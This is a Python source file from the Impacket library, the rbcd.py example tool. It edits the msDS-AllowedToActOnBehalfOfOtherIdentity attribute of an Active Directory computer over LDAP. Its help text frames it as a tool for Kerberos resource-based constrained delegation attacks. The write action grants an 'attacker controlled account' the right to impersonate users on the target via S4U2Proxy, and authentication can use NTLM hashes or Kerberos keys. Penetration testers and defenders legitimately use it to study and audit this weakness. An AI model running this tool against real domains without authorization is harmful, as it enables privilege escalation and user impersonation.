#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer
#
# Authors:
#   Remi Gascou (@podalirius_)
#   Charlie Bromberg (@_nwodtuhs)
#
#  ToDo:
# [ ]: allow users to set a ((-delegate-from-sid or -delegate-from-dn) and -delegate-to-dn) in order to skip ldapdomaindump and explicitely set the SID/DN

import argparse
import logging
import sys
import traceback

from impacket import version
from impacket.examples import logger, utils
from impacket.ldap import ldap, ldapasn1, ldaptypes

from impacket.examples.utils import ldap_login, parse_identity

def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd


# Create an ALLOW ACE with the specified sid
def create_allow_ace(sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551  # Full control
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace


class RBCD(object):
    """docstring for setrbcd"""

    LDAP_SCOPE_BASE = ldap.Scope('baseObject')

    def __init__(self, ldap_session, base_dn, delegate_to):
        super(RBCD, self).__init__()
        self.ldap_session = ldap_session
        self.base_dn = base_dn
        self.delegate_from = None
        self.delegate_to = delegate_to
        self.SID_delegate_from = None
        self.DN_delegate_to = None

    @staticmethod
    def escape_filter_chars(value):
        escaped = value.replace('\\', '\\5c')
        escaped = escaped.replace('*', '\\2a')
        escaped = escaped.replace('(', '\\28')
        escaped = escaped.replace(')', '\\29')
        escaped = escaped.replace('\x00', '\\00')
        return escaped

    @staticmethod
    def _entry_dn(entry):
        return str(entry['objectName'])

    @staticmethod
    def _get_entry_values(entry, attribute_name):
        for attribute in entry['attributes']:
            if str(attribute['type']).lower() == attribute_name.lower():
                return list(attribute['vals'])
        return []

    @classmethod
    def _get_entry_value(cls, entry, attribute_name):
        values = cls._get_entry_values(entry, attribute_name)
        return values[0] if values else None

    @staticmethod
    def _as_bytes(value):
        if value is None:
            return None
        if hasattr(value, 'asOctets'):
            return value.asOctets()
        if isinstance(value, bytes):
            return value
        return bytes(value)

    @classmethod
    def _as_string(cls, value):
        if value is None:
            return None
        if isinstance(value, bytes):
            return value.decode('utf-8')
        if hasattr(value, 'asOctets'):
            try:
                return value.asOctets().decode('utf-8')
            except UnicodeDecodeError:
                return str(value)
        return str(value)

    @classmethod
    def _as_sid_string(cls, value):
        if value is None:
            return None
        if isinstance(value, str) and value.startswith('S-'):
            return value
        sid_bytes = cls._as_bytes(value)
        if sid_bytes is None:
            return None
        return ldaptypes.LDAP_SID(data=sid_bytes).formatCanonical()

    @classmethod
    def _search_entries(cls, ldap_session, search_filter, search_base=None, search_scope=None, attributes=None, search_controls=None):
        response = ldap_session.search(
            searchBase=search_base,
            searchFilter=search_filter,
            scope=search_scope,
            attributes=attributes,
            searchControls=search_controls,
        )
        return [item for item in response if isinstance(item, ldapasn1.SearchResultEntry)]

    @staticmethod
    def _log_ldap_error(prefix, error):
        if error.getErrorCode() == 50:
            logging.error('%s, the server reports insufficient rights: %s', prefix, error.getErrorString())
        elif error.getErrorCode() == 19:
            logging.error('%s, the server reports a constrained violation: %s', prefix, error.getErrorString())
        else:
            logging.error('%s: %s', prefix, error.getErrorString())

    def read(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        self.get_allowed_to_act()

        return

    def write(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logging.error('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including previous data
        sd, targetuser = self.get_allowed_to_act()

        # writing only if SID not already in list
        if self.SID_delegate_from not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces.append(create_allow_ace(self.SID_delegate_from))
            try:
                self.ldap_session.modify(
                    self._entry_dn(targetuser),
                    {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap.MODIFY_REPLACE, [sd.getData()])]},
                )
                logging.info('Delegation rights modified successfully!')
                logging.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            except ldap.LDAPSessionError as error:
                self._log_ldap_error('Could not modify object', error)
        else:
            logging.info('%s can already impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            logging.info('Not modifying the delegation rights.')
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def remove(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logging.error('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including that data
        sd, targetuser = self.get_allowed_to_act()

        # Remove the entries where SID match the given -delegate-from
        sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if self.SID_delegate_from != ace['Ace']['Sid'].formatCanonical()]
        try:
            self.ldap_session.modify(
                self._entry_dn(targetuser),
                {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap.MODIFY_REPLACE, [sd.getData()])]},
            )
            logging.info('Delegation rights modified successfully!')
        except ldap.LDAPSessionError as error:
            self._log_ldap_error('Could not modify object', error)
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def flush(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        sd, targetuser = self.get_allowed_to_act()

        try:
            self.ldap_session.modify(
                self._entry_dn(targetuser),
                {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap.MODIFY_REPLACE, [])]},
            )
            logging.info('Delegation rights flushed successfully!')
        except ldap.LDAPSessionError as error:
            self._log_ldap_error('Could not modify object', error)
        # Get list of allowed to act
        self.get_allowed_to_act()
        return

    def get_allowed_to_act(self):
        # Get target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
        entries = self._search_entries(
            self.ldap_session,
            '(objectClass=*)',
            search_base=self.DN_delegate_to,
            search_scope=self.LDAP_SCOPE_BASE,
            attributes=['SAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'],
        )
        targetuser = entries[0] if entries else None
        if not targetuser:
            logging.error('Could not query target user properties')
            return

        try:
            raw_sd = self._as_bytes(self._get_entry_value(targetuser, 'msDS-AllowedToActOnBehalfOfOtherIdentity'))
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
            if len(sd['Dacl'].aces) > 0:
                logging.info('Accounts allowed to act on behalf of other identity:')
                for ace in sd['Dacl'].aces:
                    SID = ace['Ace']['Sid'].formatCanonical()
                    SidInfos = self.get_sid_info(ace['Ace']['Sid'].formatCanonical())
                    if SidInfos:
                        SamAccountName = SidInfos[1]
                        logging.info('    %-10s   (%s)' % (SamAccountName, SID))
            else:
                logging.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
        except IndexError:
            logging.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
            # Create DACL manually
            sd = create_empty_sd()
        return sd, targetuser

    def get_user_info(self, samname):
        entries = self._search_entries(
            self.ldap_session,
            '(sAMAccountName=%s)' % self.escape_filter_chars(samname),
            search_base=self.base_dn,
            attributes=['objectSid'],
        )
        try:
            dn = self._entry_dn(entries[0])
            sid = self._as_sid_string(self._get_entry_value(entries[0], 'objectSid'))
            return dn, sid
        except (IndexError, TypeError):
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        entries = self._search_entries(
            self.ldap_session,
            '(objectSid=%s)' % self.escape_filter_chars(sid),
            search_base=self.base_dn,
            attributes=['samaccountname'],
        )
        try:
            dn = self._entry_dn(entries[0])
            samname = self._as_string(self._get_entry_value(entries[0], 'samaccountname'))
            return dn, samname
        except (IndexError, TypeError):
            logging.error('SID not found in LDAP: %s' % sid)
            return False

def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Python (re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for Kerberos RBCD attacks.')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument("-delegate-to", type=str, required=True,
                        help="Target account the DACL is to be read/edited/etc.")
    parser.add_argument("-delegate-from", type=str, required=False,
                        help="Attacker controlled account to write on the rbcd property of -delegate-to (only when using `-action write`)")
    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read',
                        help='Action to operate on msDS-AllowedToActOnBehalfOfOtherIdentity')

    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If '
                            'omitted it will use the domain part (FQDN) specified in '
                            'the identity parameter')
    group.add_argument('-dc-host', action='store', metavar="hostname", help='Hostname of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted, -dc-ip will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def main():
    print(version.BANNER)
    args = parse_args()
    logger.init(args.ts, args.debug)

    if args.action == 'write' and args.delegate_from is None:
        logging.critical('`-delegate-from` should be specified when using `-action write` !')
        sys.exit(1)

    domain, username, password, lmhash, nthash, args.k = parse_identity(args.identity, args.hashes, args.no_pass, args.aesKey, args.k)

    try:
        base_dn = ','.join('dc=%s' % part for part in domain.split('.'))
        target = args.dc_host if args.dc_host is not None else domain
        ldap_session = ldap_login(target, base_dn, args.dc_ip, args.dc_host, args.k, username, password, domain, lmhash, nthash, args.aesKey, ldaps_flag=args.use_ldaps)
        rbcd = RBCD(ldap_session, base_dn, args.delegate_to)
        if args.action == 'read':
            rbcd.read()
        elif args.action == 'write':
            rbcd.write(args.delegate_from)
        elif args.action == 'remove':
            rbcd.remove(args.delegate_from)
        elif args.action == 'flush':
            rbcd.flush()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))


if __name__ == '__main__':
    main()
